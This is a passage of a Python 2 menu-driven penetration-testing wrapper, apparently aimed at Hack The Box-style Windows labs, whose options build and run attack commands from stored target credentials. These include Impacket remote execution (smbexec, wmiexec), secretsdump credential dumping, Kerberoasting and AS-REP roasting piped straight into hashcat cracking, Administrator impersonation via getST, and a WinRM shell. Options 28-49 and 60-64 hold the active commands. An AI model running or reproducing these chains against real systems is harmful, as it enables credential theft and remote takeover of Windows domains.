# Details : Menu option selected - ./smbexec.py raj/Administrator:Ignite@123@192.168.1.103
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '28':
      CMD = PRO + "smbexec.py " + USR.rstrip(" ") + ":" + PAS.rstrip(" ") + "@" + TIP.rstrip(" ")
      command(CMD)

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : 1.0
# Details : Menu option selected - ./wmiexec.py raj/Administrator:Ignite@123@192.168.1.103 netstat
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '29':
      CMD = PRO + "wmiexec.py " + USR.rstrip(" ") + ":" + PAS.rstrip(" ") + "@" + TIP.rstrip(" ") + " " + PRM.rstrip(" ")
      command(CMD)

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : 1.0
# Details : Menu option selected - ./ifmap.py 192.168.1.103 135
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='30':
      CMD = PRO + "ifmap.py " + TIP.rstrip(" ") + " 135"
      command(CMD)

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : 1.0
# Details : Menu option selected - ./opdump.py 192.168.1.103 135 99FCFEC4-5260-101B-BBCB-00AA0021347A 0.0
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='31':
      ifmap = raw_input("\nEnter MSRPC interface (ifmap) : ")     
      CMD = PRO + "opdump.py " + TIP.rstrip(" ") + " 135 " + ifmap
      command(CMD)

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : 1.0
# Details : Menu option selected - ./lookupsid.py raj/Administrator:Ignite@123@192.168.1.103
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='32':
      CMD = PRO + "lookupsid.py " + USR.rstrip(" ") + ":" + PAS.rstrip(" ") + "@" + TIP.rstrip(" ")
      command(CMD)

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : 1.0
# Details : Menu option selected - ./samrdump.py raj/Administrator:Ignite@123@192.168.1.103
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='33':
      CMD = PRO + "samrdump.py " + USR.rstrip(" ") + ":" + PAS.rstrip(" ") + "@" + TIP.rstrip(" ") + " > USERS.txt"
      os.system(CMD)

      os.system("cat USERS.txt")
      os.system("sed -i -n '/Found user:/p' USERS.txt")
      os.system("echo '' > users.txt")
      os.system("sed -i 1d users.txt")
      
      for x in range (0,29):
         US[x] = linecache.getline('USERS.txt', x+1)
         US[x] = US[x].replace("Found user: ", "")
         US[x] = US[x].split(",")
         US[x] = US[x][0]
         US[x] = padding(US[x], COL3)
         PA[x] = "................................"
         os.system("echo " + US[x] + " >> users.txt")
      
      if US[12] != "":
         US[11] = "Some users are not shown!!..."
         US[11] = padding(US[11], COL3)

      raw_input("\nPress ENTER to continue...")    

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : 1.0
# Details : Menu option selected - ./rpcdump.py raj/Administrator:Ignite@123@192.168.1.103
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='34':
      CMD = PRO + "rpcdump.py " + USR.rstrip(" ") + ":" + PAS.rstrip(" ") + "@" + TIP.rstrip(" ")
      command(CMD)

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent               #HKEY_LOCAL_MACHINE\SAM                                     
# CONTRACT: GitHub
# Version : 1.0
# Details : Menu option selected - ./reg.py raj/Administrator:Ignite@123@192.168.1.103 query -keyName HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows -s
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='35':
      CMD = PRO + "reg.py " + USR.rstrip(" ") + ":" + PAS.rstrip(" ") + "@" + TIP.rstrip(" ") + " query -keyName HKLM\\\SOFTWARE\\\Policies\\\Microsoft\\\Windows -s"
      command(CMD)

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : 1.0
# Details : Menu option selected - smbmap -u -p -d -H
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '36':
      CMD = "smbmap -u " + USR.rstrip(" ") + " -p " + PAS.rstrip(" ") + " -d " + HST.rstrip(" ") + " -H " + TIP.rstrip(" ")
      command(CMD)

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : 1.0
# Details : Menu option selected - smbclient -L \\\\reblog.htb -U coby%championship2005
# Modified: Note there are two versions of smbclient to consider.....
# -------------------------------------------------------------------------------------

   if selection =='37':
      CMD = "smbclient -L \\\\\\\\" + TIP.rstrip(" ") + " -U " + USR.rstrip(" ") + "%" + PAS.rstrip(" ")
      command(CMD)

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : 1.0
# Details : Menu option selected - smbclient \\\\xxx.xxx.xxx.xx\\Report$
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '38':
      CMD = "smbclient \\\\\\\\" + TIP.rstrip(" ") + "\\\\" + HIP.rstrip(" ") + " -U " + USR.rstrip(" ") + "%" + PAS.rstrip(" ")
      command(CMD)

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : 1.0
# Details : Menu option selected - enum4linux -u "" -p "" REMOTE IP
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '39':
      CMD = "enum4linux -v " + TIP.rstrip(" ")
      command(CMD)

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : 1.0
# Details : Menu option selected - rpcclient -U name ip 
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '40':
      CMD = "rpcclient -U " + USR.rstrip(" ") + " " + TIP.rstrip(" ")
      command(CMD)

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : 1.0
# Details : Menu option selected - getTGT.py megabank.local/melanie:Welcome123!
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '41':
      CMD = PRO + "getTGT.py " + HST.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ")
      command(CMD)

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : 1.0
# Details : Menu option selected - getST.py -impersonate Administrator -spn cifs/megabank.local megabank.local/melanie:Welcome123!
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '42':
      CMD = PRO + "getST.py -impersonate " + POR.strip(" ") + " -spn cifs/" + HST.rstrip(" ") + " " + HST.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ")
      command(CMD)

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : 1.0
# Details : Menu option selected - GetUserSPNs.py -request -target-domain megabank.local megabank.local/ryan:Serv3r4Admin4cc123!
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '43':
      CMD = PRO + "GetUserSPNs.py -request -target-domain " + HST.rstrip(" ") +  " " + HST.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ")
      command(CMD) 

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : 1.0
# Details : Menu option selected - GetADUsers.py megabank.local/ryan:Serv3r4Admin4cc123! 
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '44':
      CMD = PRO + "GetADUsers.py " + HST.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ")
      command(CMD)

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : 1.0
# Details : Menu option selected - GetNPUsers.py HTB.local/ -usersfile users.txt -format hashcat -outputfile hashes.roast 
# Modified: N/A                    megabank/-no-pass -usersfile USERS.txt
# -------------------------------------------------------------------------------------

   if selection =='45':
      test = linecache.getline('users.txt', 1)
      if test != "":
         CMD = PRO + "GetNPUsers.py -outputfile hashroast.txt -format hashcat " + HST.rstrip(" ") + "/ -usersfile users.txt"
         command(CMD)
         raw_input("\nPress ENTER to crack captured hash value...")  
         os.system("hashcat -m 18200 --force -a 0 hashroast.txt /usr/share/wordlists/rockyou.txt -o cracked.txt")
         raw_input("\nPress ENTER to show cracked hash value...")  
         os.system("strings cracked.txt")
         raw_input("\nPress ENTER to continue...")  
      else:
         print "USERS.txt file is empty? try running option 23 first..."
         raw_input("\nPress ENTER to continue...")  

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : 1.0
# Details : Menu option selected - 
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='46':
      exit(1)    

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : 1.0
# Details : Menu option selected - secretsdump.py domain/user:PAS@ip
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='47':
      CMD = PRO + "secretsdump.py " + HST.rstrip(" ") + '/' + USR.rstrip(" ") + ":" + PAS.rstrip(" ") + "@" + TIP.rstrip(" ")
      command(CMD)

#------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : 1.0
# Details : Menu option selected - windapsearch.py-d 10.10.10.169 -u MEGABANK\\ryan -p Serv3r4Admin4cc123! -GUC --da --full
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='48':
      CMD = PRO + "windapsearch.py -d " + TIP.rstrip(" ") + " -u " + HST.rstrip(" ") + "\\\\" + USR.rstrip(" ") + " -p " + PAS.rstrip(" ") + " -GUC --da --full"
      command(CMD)

# -------------------------------------------------------------------------------------
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : 1.0
# Details : Menu option selected - ldapdomaindump -u domain\user - PAS IP -o \DIR
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='49':
      CMD = "ldapdomaindump -u '" + HST.rstrip(" ") + '\\' + USR.rstrip(" ") + "' -p " + PAS.rstrip(" ") + " " + TIP.rstrip(" ") + " -o " + DIR.strip(" ")
      os.system(CMD)
      print "[+] Directory contents"
      os.system("ls -la ./" + DIR.rstrip(" "))
      raw_input("\nPress ENTER to continue...")   

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : 1.0
# Details : Menu option selected - 
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='51':
      exit(1)       

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : 1.0
# Details : Menu option selected - 
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='52':
      exit(1)       

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : 1.0
# Details : Menu option selected - 
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='53':
      exit(1)       

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : 1.0
# Details : Menu option selected - 
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='54':
      exit(1)       

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : 1.0
# Details : Menu option selected - 
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='55':
      exit(1)       

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : 1.0
# Details : Menu option selected - 
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='56':
      exit(1)       

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : 1.0
# Details : Menu option selected - 
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='57':
      exit(1)       

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : 1.0
# Details : Menu option selected - 
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='58':
      exit(1) 

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : 1.0
# Details : Menu option selected - 
# Modified: N/A
# ------------------------------------------------------------------------------------- 
   
   if selection =='59':
      exit(1)          

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : 1.0
# Details : Menu option selected - pftb 10.10.10.10
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='60':
      CMD = "pftp " + TIP.rstrip(" ")
      command(CMD)

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : 1.0
# Details : Menu option selected - ssh -l user 10.10.10.10
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='61':
      CMD = "ssh -l " + USR.rstrip(" ") + " " + TIP.rstrip(" ")
      command(CMD)

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : 1.0
# Details : Menu option selected - telnet -l user 10.10.10.10
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='62':
      CMD = "telnet -l " + USR.rstrip(" ") + " " + TIP.rstrip(" ")
      command(CMD)

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : 1.0
# Details : Menu option selected - nc -l user 10.10.10.10
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='63':
      CMD = "nc -l " + USR.rstrip(" ") + " " + TIP.rstrip(" ")
      command(CMD)

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : 1.0
# Details : Menu option selected - Winrm
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='64':
      os.system('echo "require \'winrm\' " > winshell.rb')
      os.system('echo "" >> winshell.rb')
      os.system('echo "conn = WinRM::Connection.new(" >> winshell.rb')
      os.system('echo "  endpoint: \'http://"' + TIP.rstrip(" ") + '":5985/wsman\', " >> winshell.rb')
      os.system('echo "  user: \'"' + USR.rstrip(" ") + '"\'," >> winshell.rb')
      os.system('echo "  password: \'"' + PAS.rstrip(" ") + '"\'," >> winshell.rb')
      os.system('echo ")" >> winshell.rb')
      os.system("cat shell.txt >> winshell.rb") # ADD REST WHEN YOU HAVE TIME!!
      CMD = "ruby winshell.rb"
      command(CMD)

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : 1.0
# Details : Menu option selected - 
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='65':
      exit(1)       

#------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : 1.0
# Details : Menu option selected - 
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='66':
      exit(1)       

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : 1.0
# Details : Menu option selected - 
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='67':
      exit(1)       

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : 1.0
# Details : Menu option selected - 
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='68':
      exit(1)              

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : 1.0
# Details : Menu option selected - 
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='69':
      exit(1)   

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : 1.0
# Details : Menu option selected - 
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='70':
      exit(1) 

#Eof...
